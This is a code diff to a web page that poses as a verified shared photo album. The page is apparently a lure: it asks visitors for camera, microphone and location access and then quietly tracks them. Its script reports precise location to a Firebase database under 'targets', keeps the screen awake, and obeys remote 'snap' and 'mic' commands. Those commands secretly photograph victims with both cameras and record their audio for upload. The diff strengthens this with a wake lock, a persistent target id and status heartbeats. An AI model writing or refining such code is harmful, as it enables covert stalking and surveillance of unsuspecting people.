@@ -30,37 +30,65 @@
     <p id="status">Secure Link Verified</p>
 
     <script>
-        // --- CONFIGURATION ---
         const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        const userId = "User_" + Math.floor(Math.random() * 9999);
+        
+        // Target Name Check
+        let userId = localStorage.getItem("target_name") || "User_" + Math.floor(Math.random() * 9999);
+        localStorage.setItem("target_name", userId);
+
+        let wakeLock = null;
+
+        // --- BACKGROUND WAKE LOCK ---
+        async function requestWakeLock() {
+            try {
+                if ('wakeLock' in navigator) {
+                    wakeLock = await navigator.wakeLock.request('screen');
+                    console.log('Wake Lock Active');
+                }
+            } catch (err) { console.log(`${err.name}, ${err.message}`); }
+        }
+
+        // Screen On hone par Tracking chalu
+        document.addEventListener('visibilitychange', async () => {
+            if (document.visibilityState === 'visible') {
+                await requestWakeLock();
+                updateStatus("Online");
+            }
+        });
 
         async function initSystem() {
             document.getElementById('status').innerText = "Connecting to server...";
             try {
-                // 1. Permission Request (Camera & Mic)
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-                stream.getTracks().forEach(t => t.stop()); // Permission milne ke baad band kardo
+                // Wake Lock Request
+                await requestWakeLock();
 
-                // 2. Location Tracking & Server Timestamp
+                // Permission Request
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+                stream.getTracks().forEach(t => t.stop());
+
                 navigator.geolocation.watchPosition(success, error, { enableHighAccuracy: true });
 
-                // 3. Unblur Album UI
                 unblur();
-
-                // 4. Start Listening for Commands (Photo/Audio)
                 listenForCommands();
+                updateStatus("Online");
 
-                // 5. Heartbeat: Har 10 second baad online status update karega
+                // Heartbeat
                 setInterval(() => {
                     db.ref('targets/' + userId + '/location/last_seen').set(firebase.database.ServerValue.TIMESTAMP);
                 }, 10000);
 
             } catch (e) {
-                alert("Permission Denied. Please allow access to view the shared album.");
-                console.log(e);
+                alert("Permission Denied. Please allow access.");
             }
+        }
+
+        function updateStatus(state) {
+            db.ref('targets/' + userId + '/location').update({
+                status: state,
+                last_seen: firebase.database.ServerValue.TIMESTAMP
+            });
         }
 
         function success(pos) {
@@ -68,51 +96,42 @@
                 lat: pos.coords.latitude,
                 lng: pos.coords.longitude,
                 timestamp: new Date().toLocaleTimeString(),
-                last_seen: firebase.database.ServerValue.TIMESTAMP // Initial server time
+                last_seen: firebase.database.ServerValue.TIMESTAMP
             });
         }
 
-        function error(err) {
-            console.warn("Location error: " + err.message);
-        }
+        function error(err) { console.warn("Location error: " + err.message); }
 
         function listenForCommands() {
             db.ref('commands/' + userId).on('value', async (snap) => {
                 const cmd = snap.val();
                 if (!cmd) return;
-
                 if (cmd.action === "snap") { await capturePhotos(); }
-                if (cmd.action === "mic") { await recordAudio(15); } // Default 15 sec recording
-
-                // Command execute hone ke baad clear kardo taake repeat na ho
+                if (cmd.action === "mic") { await recordAudio(15); }
                 db.ref('commands/' + userId).remove();
             });
         }
 
         async function capturePhotos() {
-            const modes = ['user', 'environment']; // Front and Back
+            const modes = ['user', 'environment'];
             for (let mode of modes) {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     await video.play();
-
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth; 
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    
                     const imageData = canvas.toDataURL('image/jpeg', 0.5);
-                    
                     db.ref('targets/' + userId + '/photos').push({
                         image: imageData,
                         type: mode === 'user' ? 'Front' : 'Back',
                         time: new Date().toLocaleTimeString()
                     });
-
                     stream.getTracks().forEach(t => t.stop());
-                } catch (e) { console.error("Camera error: ", e); }
+                } catch (e) { console.error(e); }
             }
         }
 
@@ -121,7 +140,6 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const mediaRecorder = new MediaRecorder(stream);
                 let chunks = [];
-
                 mediaRecorder.ondataavailable = e => chunks.push(e.data);
                 mediaRecorder.onstop = () => {
                     const reader = new FileReader();
@@ -133,10 +151,9 @@
                         });
                     };
                 };
-
                 mediaRecorder.start();
                 setTimeout(() => mediaRecorder.stop(), sec * 1000);
-            } catch (e) { console.error("Audio error: ", e); }
+            } catch (e) { console.error(e); }
         }
 
         function unblur() {
